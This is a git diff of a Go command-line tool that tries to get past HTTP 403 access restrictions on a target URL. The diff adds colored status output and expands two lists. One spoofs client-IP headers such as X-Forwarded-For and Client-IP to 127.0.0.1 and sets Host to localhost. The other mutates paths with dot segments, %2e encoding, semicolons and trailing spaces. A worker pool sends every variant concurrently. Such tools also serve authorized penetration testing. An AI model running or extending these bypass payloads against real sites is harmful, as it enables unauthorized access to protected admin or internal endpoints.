@@ -9,6 +9,16 @@ import (
 	"time"
 )
 
+// Colors
+const (
+	ColorReset  = "\033[0m"
+	ColorRed    = "\033[31m"
+	ColorGreen  = "\033[32m"
+	ColorYellow = "\033[33m"
+	ColorBlue   = "\033[34m"
+	ColorCyan   = "\033[36m"
+)
+
 type Config struct {
 	URL     string
 	Path    string
@@ -22,6 +32,37 @@ type Job struct {
 	URL        string
 	Method     string
 	Headers    map[string][]string
+}
+
+var bypassHeaders = []map[string][]string{
+	{"X-Originating-IP": {"127.0.0.1"}},
+	{"X-Forwarded-For": {"127.0.0.1"}},
+	{"X-Forwarded": {"127.0.0.1"}},
+	{"Forwarded-For": {"127.0.0.1"}},
+	{"X-Remote-IP": {"127.0.0.1"}},
+	{"X-Remote-Addr": {"127.0.0.1"}},
+	{"X-ProxyUser-Ip": {"127.0.0.1"}},
+	{"X-Original-URL": {"127.0.0.1"}},
+	{"Client-IP": {"127.0.0.1"}},
+	{"True-Client-IP": {"127.0.0.1"}},
+	{"Cluster-Client-IP": {"127.0.0.1"}},
+	{"X-ProxyUser-Ip": {"127.0.0.1"}},
+	{"Host": {"localhost"}},
+}
+
+var pathBypassPatterns = []string{
+	"%s/%s", // Default URL
+	"%s/./%s",
+	"%s/../%s",
+	"%s/%%2e/%s",
+	"%s/%s/",
+	"%s/%s%%20/",
+	"%s/;/%s",
+	"%s/.;/%s",
+	"%s//;//%s",
+	"%s//%s//",
+	"%s/%s.json",
+	"%s/./%s/..",
 }
 
 func parseFlags() Config {
@@ -59,33 +100,17 @@ func parseFlags() Config {
 		config.URL = "https://" + config.URL
 	}
 
-	if !strings.HasSuffix(config.URL, "/") {
-		config.URL += "/"
-	}
-
+	config.URL = strings.TrimSuffix(config.URL, "/")
 	config.Path = strings.Replace(config.Path, "/", "", -1)
 
 	return config
 }
 
-var bypassHeaders = []map[string][]string{
-	{"X-Forwarded-For": {"127.0.0.1"}},
-	{"X-Original-URL": {"/admin"}},
-	{"Referer": {"https://google.com"}},
-}
-
-var pathBypassPatterns = []string{
-	"%s//%s",
-	"%s/./%s",
-	"%s/../%s",
-	"%s/%2e/%s",
-	"%s%s/",
-	"%s%s%%20/",
-}
-
 func generateBypassPaths(url string, path string) []string {
 
 	var bypassPaths []string
+
+	bypassPaths = append(bypassPaths, fmt.Sprintf("%s/%s", url, strings.ToUpper(path)))
 
 	for _, pattern := range pathBypassPatterns {
 		bypassPaths = append(bypassPaths, fmt.Sprintf(pattern, url, path))
@@ -101,7 +126,7 @@ func worker(client *http.Client, jobs <-chan Job, wg *sync.WaitGroup, rateLimite
 
 		req, err := http.NewRequest(job.Method, job.URL, nil)
 		if err != nil {
-			fmt.Printf("Error creating request: %v", err)
+			fmt.Printf("Error creating request: %v\n", err)
 			continue
 		}
 
@@ -116,18 +141,29 @@ func worker(client *http.Client, jobs <-chan Job, wg *sync.WaitGroup, rateLimite
 
 		resp, err := client.Do(req)
 		if err != nil {
-			fmt.Printf("Response error: %v", err)
+			fmt.Printf("Response error: %v\n", err)
 			continue
 		}
 		func() {
 			defer resp.Body.Close()
+			statusColor := ColorYellow
+
+			switch resp.StatusCode {
+			case http.StatusOK:
+				statusColor = ColorGreen
+			case http.StatusForbidden:
+				statusColor = ColorRed
+			case http.StatusNotFound:
+				statusColor = ColorYellow
+			}
+
 			switch job.BypassType {
 			case "path":
-				fmt.Printf("Response: [%d], URL: %s", resp.StatusCode, job.URL)
+				fmt.Printf("Response: [%s%d%s], URL: %s\n", statusColor, resp.StatusCode, ColorReset, job.URL)
 			case "header":
-				fmt.Printf("Response: [%d]\n", resp.StatusCode)
+				fmt.Printf("Response: [%s%d%s], Header: ", statusColor, resp.StatusCode, ColorReset)
 				for key, values := range job.Headers {
-					fmt.Printf("%s", key)
+					fmt.Printf("%s: ", key)
 					for _, value := range values {
 						fmt.Printf("%s", value)
 					}
@@ -153,7 +189,7 @@ func generateJobs(config Config) chan Job {
 		jobs <- job
 	}
 
-	defaultPath := fmt.Sprintf("%s%s", config.URL, config.Path)
+	defaultPath := fmt.Sprintf("%s/%s", config.URL, config.Path)
 	for _, header := range bypassHeaders {
 		job := Job{
 			BypassType: "header",
